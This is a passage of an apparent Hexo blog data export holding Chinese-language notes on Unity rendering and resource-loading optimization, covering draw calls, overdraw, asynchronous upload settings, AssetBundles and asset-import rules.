渲染网格模型平均每帧的渲染像素值\n\n# 带宽(Bandwidth)\n\n# Shader复杂度(ALU)\n\n\n# 后期处理效果\n\n* 1:屏幕区域后效区分化(不同区域强度差异),特效,角色,天空,互相映照会影响彼此,需要区分.\n* 2:Distort 效果兼容(需要 Grad)\n* 3:不同对象后效的去分化处理,同一对象不同部位区分化\n* 4:Blit 带宽性能瓶颈\n* 5:Stencil buffer 在 OnRenderImage 之前会被 Clear,依赖 Depth Buffer\n\n# 问题出在哪里?\n* 不透明物体的渲染\n```\nMeshRenderer.Render 非蒙皮网格渲染\nMesh.DrawVBO        Draw Call\nMeshSkinning.Render 蒙皮网格渲染\nMaterial.SetPassFast 设置渲染状态. 调用次数与材质数目成正比,与批次成正比,是在每次提交 Draw Call之前,修改 Render State(混合,深度测试等)\n对于不透明物体的渲染,进行优化,需要:减少 Draw Call,减少材质,减少面片数.\n对于不透明物体的耗时:与物体个数(Draw Call)成正比,与单个物体面片数不敏感,与场景中使用材质数目成正比;对于 CPU 端耗时的影响程度:物体个数>材质数据>单个物体面片数\n```\n* 半透明物体的渲染\n```\nMeshRenderer.Render 场景中半透明渲染\nMesh.DrawVBO        Draw Call\nMesh.CreateVBO      NGUI的消耗一般在这个地方\nParticleSystem.ScheduleGeometryJobs    与在相机窗口内部的粒子系统个数成正比 >> 子线程调用ParticleSystem.GeometryJobs方法\nParticleSystem.SubmitVBO 粒子系统渲染\nBatchRenderer.Add   UGUI的消耗一般藏在这里\n对于粒子系统,进行优化,需要:减粒子系统个数,减粒子个数\n\n```","slug":"Unity/Optimize/Unity渲染优化","published":1,"updated":"2020-07-08T11:26:07.617Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0c003t2gk79pgu2li1","content":"<h1 id=\"Draw-Call\"><a href=\"#Draw-Call\" class=\"headerlink\" title=\"Draw Call\"></a>Draw Call</h1><ul>\n<li>setPass Calls: pass 指的是 shader 里面的 pass 代码块;setPass表示材质切换(避免出现 Material Instance);setPass Calls指的是在运行期间,经过了多少次的材质切换;setPass Calls小于或者远小于 Draw Calls/Total Batches 的.当粒子停止播放,但是没有 Deactive 的情况下,引擎还是会画(setPass Calls增加),但是什么都没有画出来(Draw Calls 为 0).</li>\n<li>Batches : 非常重要,在 Frame Debug 里面可以看到当前帧画出的数据,所有右边的值加载一起,就是总量.动态合批,静态合批,字体 Mesh,图片 Mesh 等</li>\n<li>Draw Calls : 与Batches是不相同的,但是这个值目前大部分是与 DrawCalls 相同的,但是这个值一定等于 OpenGL 调用 glDrawElements 的次数,最好的情况下就是一个Batches方法的调用栈里面只有一次glDrawElements方法</li>\n<li><a href=\"https://github.com/Unity-Technologies/BatchBreakingCause\" target=\"_blank\" rel=\"noopener\">https://github.com/Unity-Technologies/BatchBreakingCause</a> 该项目说明了为什么不能合批的原因,以及做法</li>\n</ul>\n<h1 id=\"RenderState\"><a href=\"#RenderState\" class=\"headerlink\" title=\"RenderState\"></a>RenderState</h1><ul>\n<li>RenderState 切换 </li>\n<li>Unity5.5 版本之前有一个 Material.SetPassFast 的方法,表示渲染状态切换.</li>\n<li>避免过多的 Instance Material 生成,也就是一个材质被改变了里面的参数,导致当前的Material会变成 Material(Instance),多出来一份甚至几份.使用 MaterialPropertyBlock 功能,<a href=\"https://blog.uwa4d.com/archives/1983.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/1983.html</a>;       </li>\n<li>Texture2DArray:相同 size/format/flags ,适合场景中存在的大量,多次采样的同种材质,比如:大量同种PBR 材质的怪物,潜在有点事降低 DrawCall;网格不必相同,只需要可以传递参数到 shader 中即可,比如在uv,color 等属性上记录;后续在 UI,大规模场景渲染中具备很大的发挥潜力</li>\n</ul>\n<h1 id=\"填充率-FillRate\"><a href=\"#填充率-FillRate\" class=\"headerlink\" title=\"填充率(FillRate)\"></a>填充率(FillRate)</h1><h5 id=\"OverDraw\"><a href=\"#OverDraw\" class=\"headerlink\" title=\"OverDraw\"></a>OverDraw</h5><ul>\n<li>检查标准,总填充数,平均填充倍数,单像素最大填充数(某一帧,某一点上面,过量的填充,比如粒子特效).</li>\n<li>半透明区域像素在一帧中被渲染多遍,UI 界面,粒子特效.全屏 UI,可以尝试 Deavtive 主场景的(背后场景的,其他的) Camera; 半屏 UI,可以根据需求将主场景(背后的场景,其他的场景)渲染成背景 RT;</li>\n<li>mask 组件的 overdraw,使用 Rect Mask; </li>\n<li>使用 Empty Click UI,空纹理检测点击,无渲染;</li>\n<li>对常驻的粒子特效,比如烟雾,使用插件 OffScreen Particle Rendering </li>\n<li>Scene View 里面可以看到 Overdraw 不透明也可以叠加,可能不准确,但是足够,使用的方式是 Shader Replacement 做的;透明图片,4 层之后会降低帧率</li>\n<li>天空盒肯定会先画一遍;Over Shading 出现在小面积或者狭长 Triangle 渲染时,GPU 并不是单像素采样,而是 2x2 方形采样;</li>\n</ul>\n<h5 id=\"Over-Shading-过着色\"><a href=\"#Over-Shading-过着色\" class=\"headerlink\" title=\"Over Shading 过着色\"></a>Over Shading 过着色</h5><ul>\n<li>出现在小面积或狭长 Triangle 渲染时.三角形占用 4 个像素,但是 GPU 画图时,会一次性画很多像素,其他画出的像素就浪费性能.</li>\n<li>找到使用率低的 Mesh,进行线下简化</li>\n<li>Level Of Detail,进行实时简化<h5 id=\"网格资源渲染密度分析\"><a href=\"#网格资源渲染密度分析\" class=\"headerlink\" title=\"网格资源渲染密度分析\"></a>网格资源渲染密度分析</h5></li>\n<li>渲染网格模型在每单位像素中,网格顶点的渲染数量</li>\n<li>渲染网格模型平均每帧的渲染像素值</li>\n</ul>\n<h1 id=\"带宽-Bandwidth\"><a href=\"#带宽-Bandwidth\" class=\"headerlink\" title=\"带宽(Bandwidth)\"></a>带宽(Bandwidth)</h1><h1 id=\"Shader复杂度-ALU\"><a href=\"#Shader复杂度-ALU\" class=\"headerlink\" title=\"Shader复杂度(ALU)\"></a>Shader复杂度(ALU)</h1><h1 id=\"后期处理效果\"><a href=\"#后期处理效果\" class=\"headerlink\" title=\"后期处理效果\"></a>后期处理效果</h1><ul>\n<li>1:屏幕区域后效区分化(不同区域强度差异),特效,角色,天空,互相映照会影响彼此,需要区分.</li>\n<li>2:Distort 效果兼容(需要 Grad)</li>\n<li>3:不同对象后效的去分化处理,同一对象不同部位区分化</li>\n<li>4:Blit 带宽性能瓶颈</li>\n<li>5:Stencil buffer 在 OnRenderImage 之前会被 Clear,依赖 Depth Buffer</li>\n</ul>\n<h1 id=\"问题出在哪里\"><a href=\"#问题出在哪里\" class=\"headerlink\" title=\"问题出在哪里?\"></a>问题出在哪里?</h1><ul>\n<li>不透明物体的渲染<pre><code>MeshRenderer.Render 非蒙皮网格渲染\nMesh.DrawVBO        Draw Call\nMeshSkinning.Render 蒙皮网格渲染\nMaterial.SetPassFast 设置渲染状态. 调用次数与材质数目成正比,与批次成正比,是在每次提交 Draw Call之前,修改 Render State(混合,深度测试等)\n对于不透明物体的渲染,进行优化,需要:减少 Draw Call,减少材质,减少面片数.\n对于不透明物体的耗时:与物体个数(Draw Call)成正比,与单个物体面片数不敏感,与场景中使用材质数目成正比;对于 CPU 端耗时的影响程度:物体个数&gt;材质数据&gt;单个物体面片数</code></pre></li>\n<li>半透明物体的渲染<pre><code>MeshRenderer.Render 场景中半透明渲染\nMesh.DrawVBO        Draw Call\nMesh.CreateVBO      NGUI的消耗一般在这个地方\nParticleSystem.ScheduleGeometryJobs    与在相机窗口内部的粒子系统个数成正比 &gt;&gt; 子线程调用ParticleSystem.GeometryJobs方法\nParticleSystem.SubmitVBO 粒子系统渲染\nBatchRenderer.Add   UGUI的消耗一般藏在这里\n对于粒子系统,进行优化,需要:减粒子系统个数,减粒子个数\n</code></pre></li>\n</ul>\n<p>```</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Draw-Call\"><a href=\"#Draw-Call\" class=\"headerlink\" title=\"Draw Call\"></a>Draw Call</h1><ul>\n<li>setPass Calls: pass 指的是 shader 里面的 pass 代码块;setPass表示材质切换(避免出现 Material Instance);setPass Calls指的是在运行期间,经过了多少次的材质切换;setPass Calls小于或者远小于 Draw Calls/Total Batches 的.当粒子停止播放,但是没有 Deactive 的情况下,引擎还是会画(setPass Calls增加),但是什么都没有画出来(Draw Calls 为 0).</li>\n<li>Batches : 非常重要,在 Frame Debug 里面可以看到当前帧画出的数据,所有右边的值加载一起,就是总量.动态合批,静态合批,字体 Mesh,图片 Mesh 等</li>\n<li>Draw Calls : 与Batches是不相同的,但是这个值目前大部分是与 DrawCalls 相同的,但是这个值一定等于 OpenGL 调用 glDrawElements 的次数,最好的情况下就是一个Batches方法的调用栈里面只有一次glDrawElements方法</li>\n<li><a href=\"https://github.com/Unity-Technologies/BatchBreakingCause\" target=\"_blank\" rel=\"noopener\">https://github.com/Unity-Technologies/BatchBreakingCause</a> 该项目说明了为什么不能合批的原因,以及做法</li>\n</ul>\n<h1 id=\"RenderState\"><a href=\"#RenderState\" class=\"headerlink\" title=\"RenderState\"></a>RenderState</h1><ul>\n<li>RenderState 切换 </li>\n<li>Unity5.5 版本之前有一个 Material.SetPassFast 的方法,表示渲染状态切换.</li>\n<li>避免过多的 Instance Material 生成,也就是一个材质被改变了里面的参数,导致当前的Material会变成 Material(Instance),多出来一份甚至几份.使用 MaterialPropertyBlock 功能,<a href=\"https://blog.uwa4d.com/archives/1983.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/1983.html</a>;       </li>\n<li>Texture2DArray:相同 size/format/flags ,适合场景中存在的大量,多次采样的同种材质,比如:大量同种PBR 材质的怪物,潜在有点事降低 DrawCall;网格不必相同,只需要可以传递参数到 shader 中即可,比如在uv,color 等属性上记录;后续在 UI,大规模场景渲染中具备很大的发挥潜力</li>\n</ul>\n<h1 id=\"填充率-FillRate\"><a href=\"#填充率-FillRate\" class=\"headerlink\" title=\"填充率(FillRate)\"></a>填充率(FillRate)</h1><h5 id=\"OverDraw\"><a href=\"#OverDraw\" class=\"headerlink\" title=\"OverDraw\"></a>OverDraw</h5><ul>\n<li>检查标准,总填充数,平均填充倍数,单像素最大填充数(某一帧,某一点上面,过量的填充,比如粒子特效).</li>\n<li>半透明区域像素在一帧中被渲染多遍,UI 界面,粒子特效.全屏 UI,可以尝试 Deavtive 主场景的(背后场景的,其他的) Camera; 半屏 UI,可以根据需求将主场景(背后的场景,其他的场景)渲染成背景 RT;</li>\n<li>mask 组件的 overdraw,使用 Rect Mask; </li>\n<li>使用 Empty Click UI,空纹理检测点击,无渲染;</li>\n<li>对常驻的粒子特效,比如烟雾,使用插件 OffScreen Particle Rendering </li>\n<li>Scene View 里面可以看到 Overdraw 不透明也可以叠加,可能不准确,但是足够,使用的方式是 Shader Replacement 做的;透明图片,4 层之后会降低帧率</li>\n<li>天空盒肯定会先画一遍;Over Shading 出现在小面积或者狭长 Triangle 渲染时,GPU 并不是单像素采样,而是 2x2 方形采样;</li>\n</ul>\n<h5 id=\"Over-Shading-过着色\"><a href=\"#Over-Shading-过着色\" class=\"headerlink\" title=\"Over Shading 过着色\"></a>Over Shading 过着色</h5><ul>\n<li>出现在小面积或狭长 Triangle 渲染时.三角形占用 4 个像素,但是 GPU 画图时,会一次性画很多像素,其他画出的像素就浪费性能.</li>\n<li>找到使用率低的 Mesh,进行线下简化</li>\n<li>Level Of Detail,进行实时简化<h5 id=\"网格资源渲染密度分析\"><a href=\"#网格资源渲染密度分析\" class=\"headerlink\" title=\"网格资源渲染密度分析\"></a>网格资源渲染密度分析</h5></li>\n<li>渲染网格模型在每单位像素中,网格顶点的渲染数量</li>\n<li>渲染网格模型平均每帧的渲染像素值</li>\n</ul>\n<h1 id=\"带宽-Bandwidth\"><a href=\"#带宽-Bandwidth\" class=\"headerlink\" title=\"带宽(Bandwidth)\"></a>带宽(Bandwidth)</h1><h1 id=\"Shader复杂度-ALU\"><a href=\"#Shader复杂度-ALU\" class=\"headerlink\" title=\"Shader复杂度(ALU)\"></a>Shader复杂度(ALU)</h1><h1 id=\"后期处理效果\"><a href=\"#后期处理效果\" class=\"headerlink\" title=\"后期处理效果\"></a>后期处理效果</h1><ul>\n<li>1:屏幕区域后效区分化(不同区域强度差异),特效,角色,天空,互相映照会影响彼此,需要区分.</li>\n<li>2:Distort 效果兼容(需要 Grad)</li>\n<li>3:不同对象后效的去分化处理,同一对象不同部位区分化</li>\n<li>4:Blit 带宽性能瓶颈</li>\n<li>5:Stencil buffer 在 OnRenderImage 之前会被 Clear,依赖 Depth Buffer</li>\n</ul>\n<h1 id=\"问题出在哪里\"><a href=\"#问题出在哪里\" class=\"headerlink\" title=\"问题出在哪里?\"></a>问题出在哪里?</h1><ul>\n<li>不透明物体的渲染<pre><code>MeshRenderer.Render 非蒙皮网格渲染\nMesh.DrawVBO        Draw Call\nMeshSkinning.Render 蒙皮网格渲染\nMaterial.SetPassFast 设置渲染状态. 调用次数与材质数目成正比,与批次成正比,是在每次提交 Draw Call之前,修改 Render State(混合,深度测试等)\n对于不透明物体的渲染,进行优化,需要:减少 Draw Call,减少材质,减少面片数.\n对于不透明物体的耗时:与物体个数(Draw Call)成正比,与单个物体面片数不敏感,与场景中使用材质数目成正比;对于 CPU 端耗时的影响程度:物体个数&gt;材质数据&gt;单个物体面片数</code></pre></li>\n<li>半透明物体的渲染<pre><code>MeshRenderer.Render 场景中半透明渲染\nMesh.DrawVBO        Draw Call\nMesh.CreateVBO      NGUI的消耗一般在这个地方\nParticleSystem.ScheduleGeometryJobs    与在相机窗口内部的粒子系统个数成正比 &gt;&gt; 子线程调用ParticleSystem.GeometryJobs方法\nParticleSystem.SubmitVBO 粒子系统渲染\nBatchRenderer.Add   UGUI的消耗一般藏在这里\n对于粒子系统,进行优化,需要:减粒子系统个数,减粒子个数\n</code></pre></li>\n</ul>\n<p>```</p>\n"},{"_content":"top: 5","source":"_posts/Unity/Optimize/XCode.md","raw":"top: 5","slug":"Unity/Optimize/XCode","published":1,"date":"2020-06-15T07:02:03.025Z","updated":"2020-06-15T07:10:40.540Z","title":"Unity/Optimize/XCode","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0d003x2gk7074ac20r","content":"<p>top: 5</p>\n","site":{"data":{}},"excerpt":"","more":"<p>top: 5</p>\n"},{"title":"Unity 资源优化","date":"2020-05-08T03:41:32.000Z","top":11,"_content":"\n# 资源加载模块的核心问题\n\n***\n\n## 1:加载时瓶颈?\n\n\n引擎阶段(加载阶段)|人工阶段(加载阶段)       \n------|-------     \n上一场景资源卸载 |       \n当前场景资源加载  |      \n当前场景加载后处理(GC耗时,GO销毁)      | 当前场景中,资源加载,\n当前场景实例化          | 当前场景中,AB 加载 ,实例化\n当前场景Active/Deactive | 当前场景中的 GameObject,Active/Deactive,实际初始化设置.\n\n引擎函数|人工函数       \n------|---     \nEarlyUpdate.UpdatePreloading|PreLateUpdate.ScriptRunBehaviourLateUpdate\nLoading.UpdatePreloading|LateBehaviorUpdate;  AssetBundles.Loadxxx 加载,\nUpdatePreloading|(ToLua 第三方库) LuaLooper.LateUpdate;\nApplication.WaitForAsyncOperationToComplete|\nPreload Sing Step(真正耗时的函数)|\nApplication.LoadLevelAsync;    GarbageCollectAssetsProfile(卸载上一个场景的函数,这个函数是调用 Resources.UnloadUnusedAssets();产生的(手动或者自动触发),会有大量耗时记录)|\n;    Loading.LoadFileHeaders(Loading ReadObject,这一系列函数表示在加载新场景,读取头文件,读取GameObject),LoadAwakeFromLoad(加载后处理,mesh,shader,Shader.Parse)|\nUnityEngine.SetupCoroutine(Coroutine InvokeMoveNext)(Instantiate实例化,Active,Deactive)|\nGC.Collect;    GC.FindLiveObjects,GC.MarkDependencies;UnloadScene|\n\n***\n\n## 2:资源加载是否合理?\n\n\n### 纹理\n* 1:Mac Size,分辨率尽量小于 1024,长宽需要是 2 的幂次方.\n* 2:Format,格式尽量选用 Unity 官方推荐的格式.\n* 3:Read/Write 尽量关闭\n* 4:Mipmap 尽量关闭\n* 5:Texture streaming\n\n### 网格\n* 1:Model 里面的 Meshs 设置,资源的顶点数量与顶点属性数量\n* 2:Mesh Compression 尽量选 On\n* 3:Read/Write Enabled 尽量不勾选 \n* 4:Normals尽量让 Unity 自己计算\n* 5:Blend Shape Normals\n* 6:Tangents 尽量少\n* 7:Swap UVs 尽量不勾选\n* 8:Generate Lightmap UVs,尽量不勾选\n* 9:以上选择,全是为了数据量小而选择的,不为了表现,如果为了表现,需要进行取舍\n\n### 动画片段\n* 1:片段数量\n* 2:压缩模式/动画精度/数据精度\n* 3:动画模式,Humanoid要比Generic 小很多\n\n### 音频片段\n\n* 1:音频数量,\n* 2:加载方式,Load Type-->选择 Streaming 是最快的\n* 3:压缩格式,Compression Format-->PCM(不压缩),Vorbis(ogg 的格式),ADPCM(轻度压缩),MP3\n* 4:内存最小的选择是  :加载方式选择Streaming,压缩格式选择Vorbis,Vorbis 的 Quality 可以进一步控制,建议 50%\n* 5:建议使用 MP3 格式的音频文件,如果内存压力过大,可以考虑 Streaming 加载方式或较小 Quality 质量的 Vorbis 格式\n* 6:如果是非及时使用音效(背景音乐),建议开启 Load in Background 来提升加载效率\n* 7:如果 存在大量频繁使用的音效,建议选择 Decompressed On Load 来降低 CPU 开销\n\n###  Particle System\n\n* 1:粒子系统数量\n* 2:材质,很多粒子加载,会将相同Material 加载进内存.\n\n\n### 资源加载卸载的 API\n\n* 1:Resources.Load\n* 2:Resources.LoadAsync\n* 3:AssetBundle.Load\n* 4:AssetBundle.LoadAsync\n* 5:异步加载时开启Application.backgroundLoadingPriority=ThreadPriority.High;表示异步操作可以在主线程的单帧花费最长时间。单帧花费时间越多，可加载的数据越多，因此帧率将有所下降，较为影响游戏性能，但可减少加载资源的时间，能更快的进入游戏！反之，单帧花费时间越少，可加载的数据越少，对游戏的游戏性能影响较小，可在游戏进行时有很好的后台加载。[官方文档](https://docs.unity3d.com/2017.1/Documentation/ScriptReference/Application-backgroundLoadingPriority.html)\n* 6:QualitySettings.asyncUploadTimeSlice = 2;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。使用asyncUploadTimeSlice以毫秒为单位设置异步纹理上传的时间片框架。最小值为1，最大值为33。\n* 7:QualitySettings.asyncUploadBufferSize = 4;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。设置异步纹理上传的缓冲区大小。大小的单位是兆字节。最小值为2，最大值为512。虽然缓冲区会自动调整大小以适应当前加载的最大纹理，但建议将该值设置为场景中使用的最大纹理的大小，以避免重新调整缓冲区的大小会导致性能损失。\n\n## 3:引擎如何加载一个 Prefab?\n\n为何我们调整了 资源加载卸载的API 中提到的三个参数,异步加载就变得快了.我们就要了解引擎是如何加载一个 prefab 的.一个 UI 的 Prefab 可能含有 Texture,Mesh,Material 等等很多东西.\n\n* 1:加载 Mesh 并传输到 GPU;异步串行;异步串行加载时会寻找 AssetBundle 里面含有哪些资源,然后反序列化这些资源,然后先加载这个 Prefab 的 Mesh 传到 GPU 里面;\n* 2:加载 Texture 并传输到 GPU;异步串行;\n* 3:加载 shader & Material;异步串行;前期是加载 shader,后期是主线程解析 shader\n* 4:加载 Object & Component;异步串行;\n* 5:加载 AnimationClip 资源;异步串行;完全可以放在异步里面进行加载,不会卡主线程\n* 6:加载 Audio 资源;异步串行;使用 Streaming 模式是最快的.\n* 7:大量资源的异步加载均可在子线程中进行\n* 8:主线程主要处理 AwakeFromLoad & Shader 解析\n* 9:主线程可以留出大量空间供逻辑代码使用\n\n\n***\n## 4:如何优化加载?\n\n* 1:加快 Mesh,Texture等资源的异步加载效率\n* 2:加快处理 AwakeFromLoad & Shader 解析\n* 3:Async Upload Pipeline\n> * A:加载线程异步加载 Texture 和 Mesh 资源,用了 Mesh 的压缩,需要在主线程进行解压,是不能进行异步加载的,地形的 Texture 开了 Read/Write 是不能进行异步加载的\n> * B:通过渲染线程直接将其传送到 GPU\n> * C:目前 Unity 都支持,\n> * D:代码里面异步加载方法 AsyncUploadBuffer 加载完毕之后,直接回放到渲染线程进行渲染,渲染线程中的渲染方法AsyncUploadTimeSlice将数据上传\n* 4:优化方法:将QualitySettings.asyncUploadBufferSize = 4;改为QualitySettings.asyncUploadBufferSize = 16;表示引擎从硬盘里面每次读取 4M,变为读取 16M,读取时都是在子线程.这个参数里面的 buff 缓冲可以认为是流式的读取\n* 5:优化方法:QualitySettings.asyncUploadTimeSlice = 2;改为QualitySettings.asyncUploadBufferSize = 8;表示渲染线程每一帧使用 2ms 去干活,变为渲染线程每一帧使用  8ms 去干活,有可能就多开了一个渲染线程\n* 6:AUP 让内存占用更加可控,加载 Upload Buffer 会增加一个恒定的内存,除此之外几乎没有副作用,在内存允许的情况下,可以设置 16MB 或者 32MB.对于asyncUploadTimeSlice方法,如果设置过大,会产生卡顿现象.\n* 7:压缩主线程上面的资源,控制异步加载资源在主线程的\"后加载\"耗时,各种资源的 AwakeFromLoad,Shader.Parse,设置代码 Application.backgroundLoadingPriority=ThreadPriority.High;\n* 8:Texture.AwakeFromLoad 是从主线程里面将Texture传到 GPU\n* 9:优化异步加载:调整 Upload Buffer 和 Upload Time Slice,调整 BackLoadingPriority,开启多线程渲染,调整资源的加载顺序(比如 shader)\n* 10:异步加载时需要注意代码的写法,不要搞成一帧加载很多.AssetBundle 加载的写法需要注意\n* 11:需要查看实例化操作是否合理,实例化的频率,大概需要 10K 帧有大的浮动;  一般正常的加载方式是-->AB a0-->AB a1(依赖 a0)-->加载 a1-->instantiate a1;错误加载方式-->AB a1(依赖 a0)-->加载 a1-->instantiate a1-->AB a0 这种情况下 a0 资源会出现在其他错误的地方;\n* 12:需要查看Active/Deactive操作是否合理,尤其是在 NGUI/UGUI 上面\n\n***\n## 5:资源内存\n\n* 1:有很多纹理在内存里面,但是没有进行渲染,也就是没有用到.需要查看 UI图集,技能特效.\n* 2:注意纹理的分辨率大小,以及 Mipmap 是否物尽其用\n* 3:在品质设置里面有个 Texture Streaming 选项中,有个参数:Memory Budget,在其足够时,Scene Texture 是满 Mipmap 加载,动态加载的 GO Texture 是最比配的 mipmap 进行加载和实例化,渲染时,则按照距离原因和 budget 进行调整.再其不足时,Scene Texture按照最低配加载,已加载 Streamed Texture 按照距离 Remove Mipmap,越远的越先 Remove 高 Level Mipmap ,动态加载的 GO Texture 只按最低配 Mipmap 加载,实例化和渲染.\n* 4:Max Level Reduction设定为 1 表示加载 mipmap 第一级,设置为 2 加载第二级\n* 5:在 mobile 端一定要设置 QualitySettings.streamingMipmapsActive = true;\n* 6:网格:关注顶点渲染密度.\n* 7:音频片段,Streaming 加载方式比较适合于背景音乐,对于同时播放的小音频文件,建议通过 Decompressed 方式.\n\n*** \n\n\n## 6:AB 包\n* 1:建议目前全部采用 LZ4 压缩\n* 2:本地加载,建议使用 LoadFromFile(Async)来加载\n* 3:根据机型,选择适合的 Coroutine 次数\n* 4:如果自己压缩,建议使用 Gzip+LoadFromFile(Async)来加载\n* 5:AssetBundle.LoadAll 比 Asset.Load OneByOne 要好很多.\n* 6:切换场景时,尽可能使用 AssetBundle.Load 来提升加载效率\n* 7:小,细碎的同种类资源打包在一起(Shader,ParticleSystem)\n\n\n*** \n## 7:Mono堆内存\n\n* 1:子线程 Mono 分配,多见于和服务器交互.\n* 2:Lua 内存检测,关注 Destroyed 总数.\n* 3:Instantiate 实例化频率,实例化的耗时.\n* 4:Active/Deactive 频率和耗时.复杂的界面/带有动画组件的 GameObject 不要频繁使用\n\n\n\n# 资源规范\n\n* 1 Animation \n```\n检查动画曲线精度:动画曲线精度过高会增加动画占用内存; 此规则仅面向以文本格式序列化的*.anim文件中的浮点精度;用文本编辑器打开.anim动画文件，修改m_EditorCurves::curve::m_Curve下的float值的精度。建议用脚本直接将此文件中所有float精度都调整为5位小数以下。动画曲线精度应小于5 ;       \n检查动画缩放曲线:动画不应具有缩放曲线,动画中的缩放曲线会增加动画占用内存,用文本编辑器打开.anim动画文件，确认m_EditorCurves和m_FloatCurves下不包括attribute为m_Scale的curve子对象。动画不应具有缩放曲线;\n```\n* 2 AnimationController \n```\n动画控制器中的动画剪辑个数: 动画控制器中动画剪辑数量过多会造成动画初始化耗时过多;动画剪辑个数应小于2\n```\n* 3 FBX     \n```\n检查读/写标志:开启FBX资源的读/写标志会导致双倍的内存占用;FBX资源的读/写标志应该被禁用      \n检查动画资源压缩方式:动画资源使用最佳压缩方式可以提高加载效率;查看Inspector -> Animation Tab -> Anim. Compression选项;动画资源应该使用最佳压缩方式      \n应为网格资源启用OptimizeMesh;为网格资源启用OptimizeMesh可以减少最终游戏包的大小;检查网格资源的OptimizeMesh;查看Inspector -> Model Tab -> Meshes -> Optimize mesh选项;应为网格资源启用OptimizeMesh;        \n在FBX资源中有太多的顶点, 默认阈值是500;FBX资源资源中有太多的顶点, 请检查是否必要;检查FBX资源定点数;顶点数量限制;FBX资源资源中有太多的顶点;顶点数量有多少;             \n```\n* 4 Prefab\n```\nPrefab Max Particle Limit;渲染Mesh的粒子系统不宜设置过高的粒子总数, 默认阈值为30;当粒子系统渲染Mesh时(Inspector: Particle System -> Renderer -> Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子总数加以限制;检查最高粒子总数限制;检查Inspector -> Particle System -> Max Particles配置;渲染Mesh的粒子系统不宜设置过高的粒子总数;              \n检查粒子系统的发射速率:当粒子系统渲染Mesh时(Inspector: Particle System -> Renderer -> Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子发射速率加以限制;检查Inspector -> Particle System -> Emission -> Rate over Time/Distance配置;渲染Mesh的粒子系统不宜设置过高的粒子发射速率, 不应超过5             \n检查Skinned Mesh Renderer:启用Skinned Motion Vectors会使渲染器同时使用当前帧和上一帧的蒙皮网络来渲染目标的动画以提高精度，从而需要双倍大小的缓冲区并占用双倍的显存;启用Skinned Motion Vectors将以消耗双倍内存为代价提高蒙皮网格的精度;      \n检查网格读/写标记:被预制件关联的网格资源应该关闭读/写标记;被预制件关联的网格资源应该关闭读/写标记       \n```\n* 5 Scene\n```\n检查场景未添加tag的GameObject:场景中的所有GameObject都应当添加tag;场景包含未添加tag的GameObject;          \nScene Multiple Audio Listeners:一个场景不应包含多个Audio Listener;一个场景不应包含多个Audio Listener;检查场景中的Audio Listener;检查场景中所有GameObject下的Audio Listener组件;场景包含多个音频侦听器;                    \n检查场景中mesh collider:Mesh Collider可以在场景中提供更精细化的碰撞检测，随之而来也会消耗大量计算资源，建议审慎使用。 检查场景中所有GameObject下的Mesh Collider组件;场景包含了mesh collider;        \n检查场景渲染设置:在移动平台，建议在渲染设置中关闭对雾的渲染以节省计算资源。检查Window -> Rendering -> Lighting Settings -> Scene -> Other Settings -> Fog选项;在移动平台，应在设置里关闭雾的渲染;           \nScene Shadow Resolution;场景中灯光的阴影分辨率应与项目设置一致;场景中灯光的阴影分辨率应与项目设置一致;检查场景阴影分辨率;检查Inspector -> Light -> Shadow Type -> Realtime Shadows -> Resolution选项，建议使用'Use Quality Settings';场景中灯光的阴影分辨率应与项目设置一致;            \nScene Rigidbody;场景中的静态GameObject不应关联Rigidbody;静态GameObject的Rigidbody模块是无用的;检查场景中的Rigidbody;静态GameObject不应关联Rigidbody;        \nScene Canvas Component;包含太多组件的Canvas可能会影响UI刷新的性能;包含太多组件的Canvas可能会影响UI刷新的性能，并进一步影响应用的帧率;检查Canvas中的component数量;包含太多组件的Canvas可能会影响UI刷新的性能;            \nScene UI Outside Screen;场景包含屏幕外的UI组件;放置在屏幕外的UI组件尽管不可见仍会消耗渲染资源，建议删掉此组件或者修正可能出现的设置错误;检查屏幕外的UI组件;场景包含屏幕外的UI组件;            \n检查场景Animator组件中的ApplyRootMotion选项:如果不需要进行根骨骼动画位移, 建议关闭场景中Animator组件的applyRootMotion选项。场景中包含勾选了applyRootMotion选项的Animator组件;       \n检查场景Animator组件中的cullingMode:场景中Animator组件的cullingMode是AlwaysAnimate会增加CPU使用率。场景中包含cullingMode为AlwaysAnimate的Animator组件;\n```\n\n* 6 Script\n```\n检查OnGUI方法:由于内存使用率高，不应使用OnGUI方法;IMGUI是过时的UI系统，仅建议在开发调试时使用。     \n检查所有的 Mono 生命周期函数 方法:空方法会导致掉帧,建议去除。     \n```\n* 7 Shader\n```\n检查Shader中纹理数量:Shader中过多的纹理可能会增加GPU消耗;Shader中的纹理个数应小于3,Shader Texture Count\n```\n\n* 8 Texture\n```\n检查纹理读/写标记:开启纹理资源的读/写标志会导致双倍的内存占用; 检查Inspector -> Advanced -> Read/Write Enabled选项;纹理资源的读/写标志应被禁用;         \n检查Mipmap标记:未压缩的纹理资源启用Mipmap标志会增加内存占用; 检查Inspector -> Advanced -> Generate Mip Maps选项;未压缩的纹理应该禁用mipmap ;        \nTexture iOS compression format;检查iOS平台的纹理压缩格式;检查iOS平台的纹理压缩格式;iOS平台纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -> Default -> Format选项; 如果希望为iOS平台单独设置，打开旁边的iOS选项卡，勾选Override for iOS并检查下面的Format选项;iOS平台的纹理格式应该是astc;对iOS平台使用默认值，但格式不是Automatic;         \nAndroid平台纹理压缩格式:检查Android平台的纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -> Default -> Format选项; 如果希望为Android平台单独设置，打开旁边的Android选项卡，勾选Override for Android并检查下面的Format选项;对安卓平台使用默认值，但格式不是Automatic;           \n纹理资源大小2的幂次:大小非2的幂次的纹理资源将无法使用ETC1和PVRTC压缩格式。在导入时自动伸缩为2的幂次也可能会导致内存占用或者贴图质量问题。 检查Inspector -> Advanced -> Non-Power of 2选项. 建议使用原始大小为2的幂次的贴图;纹理大小不是2的幂次;         